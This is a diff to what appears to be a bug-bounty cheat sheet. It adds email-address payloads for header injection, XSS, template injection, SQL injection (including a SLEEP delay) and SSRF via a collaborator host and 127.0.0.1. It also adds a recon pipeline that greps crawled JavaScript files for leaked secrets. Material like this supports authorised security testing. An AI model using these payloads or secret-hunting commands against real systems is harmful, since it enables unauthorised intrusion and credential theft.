@@ -189,13 +189,25 @@ http://0177.00.00.01
 ---
 
 
-# Email Header Injection 
+# Email Attacks 
 
 ```
-$ "%0d%0aContent-Length:%200%0d%0a%0d%0a"@example
-.com
-$ "recipient@test.com>\r\nRCPT TO:<victim+"@test
-.com
+// Header Injection
+"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
+"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
+// XSS Injection
+test+(<script>alert(0)</script>)@example.com
+test@example(<script>alert(0)</script>).com
+"<script>alert(0)</script>"@example.com
+// SST Injection
+"<%= 7 * 7 %>"@example.com
+test+(${{7*7}})@example.com
+// SQL Injection
+"' OR 1=1 -- '"@example.com
+"mail'); SLEEP(5);--"@example.com
+// SSRF Attack
+john.doe@abc123.burpcollaborator.net
+john.doe@[127.0.0.1]
 ```
 
 
@@ -256,6 +268,20 @@ $ amass enum -passive -brute -d redacted.com | gau | egrep -v '(.css|.svg)' | wh
 $ use gauplus and paramspider , after you can grep words like "api" or "key" and use gmapsapiscanner for see if is vulnerable.
 ```
 
+
+# Find sensitive information with GF tool
+
+```
+$ gauplus redacted.com -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee domains.txt
+sort -u domains.txt | fff -s 200 -o out/
+$ for i in `gf -list`; do [[ ${i} =~ "_secrets"* ]] && gf ${i}; done
+```
+
+
+---
+
+
+#
 
 ### Thanks Follow me on Twitter
 
